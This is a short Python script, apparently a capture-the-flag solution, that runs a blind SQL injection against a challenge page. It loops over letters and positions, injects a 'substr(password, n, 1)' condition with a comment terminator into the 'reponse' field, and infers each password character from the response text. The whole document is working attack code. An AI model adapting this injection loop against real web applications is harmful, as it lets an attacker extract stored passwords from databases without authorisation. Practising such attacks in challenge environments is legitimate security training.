import requests

def main():
    try:
        alpha = [chr(i) for i in range(ord('a'), ord('z') + 1)]
        for a in alpha:
            for b in range(1, 12):
                r = requests.get("http://chall.voilixa.ml/chall/blind.php", data={"reponse":"oui' and substr(password, " + str(b) + ", 1)='" + a + "'-- -"})
                if "trop bien" in r.text:
                    print(a)
    except:
        pass
main()
